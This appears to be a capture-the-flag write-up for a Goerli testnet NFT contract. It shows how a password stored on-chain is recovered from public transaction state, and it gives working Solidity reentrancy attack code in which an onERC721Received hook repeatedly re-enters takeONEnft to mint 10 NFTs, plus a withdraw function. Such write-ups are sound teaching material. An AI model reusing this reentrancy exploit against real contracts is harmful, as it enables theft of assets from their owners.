# Vulnerability
There are two main vulnerabilities in this contract. First: no thing is secret on the blockchain. Second: Reentrancy.

## No secrets

In the takeONEnft() function it makes an external call to

```
require(
    IPassManager(0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2).read(
        password
    ),
        "wrong pass"
    );
```

this is essentially asking us if we have the correct password to mint... so we need to investigate to find out what that password is. 
I did some onchain sleuthing on the goerli testnetwork, I found two things of importantance. 1. the decompiled bytecode and 2. the first 
and only transaction....

### decompiled bytecode
I ran the decompiled bytecode into a couple of decompilers and i find that in addition to the read function there is some sort of 'set'
function that takes two arguments - bytes32 value and a boolean value. interesting.. remember we also know that the read function takes in
a bytes32 value and returns a boolean value.... very interesting.... 

### first and only transaction
I go back on goerli etherscan and look at the state changes from that first and only transaction. I see that at storage address:
0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe the value changes from 0x0 (false) to 0x0000000000000000000000000000000000000000000000000000000000000001 (true) . 

from there, we can infer that 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe is the password. why? because
when read checks that value it will return true, satisfying the condition. 

## Reentrancy
The key issue here is Checks-Effects-Interactions. More specifically here is that the minted bool variable is set to true after
_safeMint is called. allowing us to reenter before minted is set to true. how?

well if _safeMint() is called by a smart contract (not an EOA), it calls onERC721Received() from the caller's contract. the issue with that is that we can do whatever we want in our onERC721Received() function. Here is our implementation:

```
    function initializeReent()external isOwner{
        nft.takeONEnft(PASS);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        uint256 balance = nft.balanceOf(address(this));
        if (balance < 11){
            nft.takeONEnft(PASS);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
```

and remember PASS is the password we found when we investigated the smart contract. Our implementation allows us to mint 10 nfts
from the contract. then all we have to do is implement a withdraw function to give them back to our hack address

```
function withdrawNFTs() external isOwner{
        for(uint i=1;i<11;i++){
            console.log(i);
            nft.transferFrom(address(this), msg.sender, i);      
        }
    }
```
